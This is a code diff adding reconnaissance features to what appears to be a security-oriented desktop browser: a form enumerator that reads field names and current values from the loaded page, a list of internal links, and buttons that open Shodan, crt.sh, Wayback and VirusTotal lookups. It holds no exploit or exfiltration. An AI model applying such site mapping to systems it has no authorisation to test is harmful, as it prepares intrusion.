+      <div>${int.slice(0,30).map(u=>`<div class="tool-tag" onclick="navigate('${esc(u)}')" style="margin:2px;display:block;overflow:hidden;text-overflow:ellipsis;">${esc(u)}</div>`).join('')}</div></div>
+    `;
+  } catch(e) { out.innerHTML = `<div class="recon-item"><div class="recon-key">ERRO</div><div class="recon-val" style="color:var(--r);">${esc(e.message)}</div></div>`; }
+}
+
+async function reconForms() {
+  const tab = getActiveTab();
+  const out = document.getElementById('recon-out');
+  if (!tab?.wv) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-crosshairs"></i><p>Navega para um site primeiro</p></div>'; return; }
+  try {
+    const res = await tab.wv.executeJavaScript(`
+      (()=>{const forms=[...document.querySelectorAll('form')].map(f=>({
+        action:f.action,method:(f.method||'GET').toUpperCase(),
+        fields:[...f.querySelectorAll('input,textarea,select')].map(i=>({
+          name:i.name,type:i.type,value:i.value.substring(0,60)
+        }))
+      }));return JSON.stringify(forms)})()
+    `);
+    const forms = JSON.parse(res);
+    if (!forms.length) { out.innerHTML = '<div class="recon-item"><div class="recon-key">FORMS</div><div class="recon-val" style="color:var(--tx3);">Nenhum form encontrado</div></div>'; return; }
+    out.innerHTML = forms.map((f,i) => `
+      <div class="recon-item">
+        <div class="recon-key">FORM ${i+1} — <span class="${f.method==='POST'?'tool-tag warn':'tool-tag'}" style="margin:0;">${f.method}</span></div>
+        <div class="recon-val" style="font-size:9px;color:var(--c);margin-bottom:4px;">${esc(f.action)}</div>
+        ${f.fields.map(fi=>`<div style="display:flex;gap:6px;align-items:center;margin:2px 0;font-size:9px;">
+          <span class="tool-tag" style="margin:0;">${esc(fi.type||'text')}</span>
+          <span style="color:var(--tx2);">${esc(fi.name)}</span>
+          ${fi.value ? `<span style="color:var(--tx3);">${esc(fi.value)}</span>` : ''}
+        </div>`).join('')}
+      </div>
+    `).join('');
+  } catch(e) { out.innerHTML = `<div class="recon-item"><div class="recon-key">ERRO</div><div class="recon-val" style="color:var(--r);">${esc(e.message)}</div></div>`; }
+}
+
+function openReconTool(tool) {
+  const tab = getActiveTab();
+  const domain = getDomain(tab?.url || '');
+  const ip = document.getElementById('sb-ip')?.textContent?.replace('IP: ','') || '';
+  const urls = {
+    shodan:    `https://www.shodan.io/search?query=${encodeURIComponent(domain || ip)}`,
+    crtsh:     `https://crt.sh/?q=${encodeURIComponent(domain)}`,
+    wayback:   `https://web.archive.org/web/*/${encodeURIComponent(tab?.url || domain)}`,
+    virustotal:`https://www.virustotal.com/gui/domain/${encodeURIComponent(domain)}`,
+  };
+  if (urls[tool]) window.ave.openExternal(urls[tool]);
+}
 </script>
 </body>
 </html>
